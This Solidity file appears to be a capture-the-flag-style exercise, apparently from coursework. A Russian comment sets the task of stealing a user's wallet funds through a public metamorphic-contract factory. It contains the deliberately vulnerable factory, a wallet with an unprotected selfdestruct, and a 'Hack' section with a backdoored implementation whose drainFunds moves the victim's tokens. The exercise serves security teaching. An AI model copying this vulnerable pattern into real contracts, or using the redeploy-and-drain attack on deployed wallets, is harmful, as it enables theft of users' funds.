//SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/*
Пользователь не позаботился о безопасности и использовал публичную фабрику для кошелька.
Украдите все деньги с его кошелька.

Вам поможет знание про ERC-1167 и метаморфные смарт-контракты
*/
contract MetaFactory {
    mapping(address => address) _implementations;
    mapping(uint => address) public proxys;
    // bool flag;

    function deploy(uint salt, bytes calldata bytecode) public {
        bytes memory implInitCode = bytecode;

        bytes memory metamorphicCode = (
            hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"
        );

        address metamorphicContractAddress = _getMetamorphicContractAddress(
            salt,
            metamorphicCode
        );

        address implementationContract;

        assembly {
            let encoded_data := add(0x20, implInitCode)
            let encoded_size := mload(implInitCode)
            implementationContract := create(0, encoded_data, encoded_size)
        }

        _implementations[metamorphicContractAddress] = implementationContract;
        proxys[salt] = metamorphicContractAddress;

        address addr;
        assembly {
            let encoded_data := add(0x20, metamorphicCode)
            let encoded_size := mload(metamorphicCode)
            addr := create2(0, encoded_data, encoded_size, salt)
        }

        // if (!flag) {
        //     flag = true;
        // } else {
        //     assembly {
        //         let ptr := mload(0x40)
        //         mstore(ptr, addr)
        //         revert(ptr, 32)
        //     }
        // }

        require(
            addr == metamorphicContractAddress,
            "Failed to deploy the new metamorphic contract."
        );
    }

    function _getMetamorphicContractAddress(
        uint256 salt,
        bytes memory metamorphicCode
    ) internal view returns (address) {
        // determine the address of the metamorphic contract.
        return
            address(
                uint160( // downcast to match the address type.
                    uint256( // convert to uint to truncate upper digits.
                        keccak256( // compute the CREATE2 hash using 4 inputs.
                            abi.encodePacked( // pack all inputs to the hash together.
                                hex"ff", // start with 0xff to distinguish from RLP.
                                address(this), // this contract will be the caller.
                                salt, // pass in the supplied salt value.
                                keccak256(abi.encodePacked(metamorphicCode))
                            )
                        )
                    )
                )
            );
    }

    function getImplementation()
        external
        view
        returns (address implementation)
    {
        return _implementations[msg.sender];
    }
}

contract WalletERC20 {
    ERC20 public token;
    bool public isInitialized;

    function initializer(address _addr) external {
        require(!isInitialized);
        token = ERC20(_addr);
        isInitialized = true;
    }

    function myBalance() external view returns (uint) {
        return token.balanceOf(address(this));
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract HSE is ERC20 {
    constructor() ERC20("HigherSchoolOfEconomics", "HSE") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

/* -------------------- Hack -------------------- */
/* 
    Description.
    Just killing proxy, because we can to. 
    Then deploy our own contract for proxy impl with backdoor with same salt (we know it from blockchain).
*/

contract WalletAttackerImpl {
    ERC20 public token;

    function initializer(address _tokenAddress) external {
        require(address(token) == address(0), "Already initialized");
        token = ERC20(_tokenAddress);
    }

    function myBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function drainFunds(address _to) external {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "1");
        token.transfer(_to, balance);
    }
}
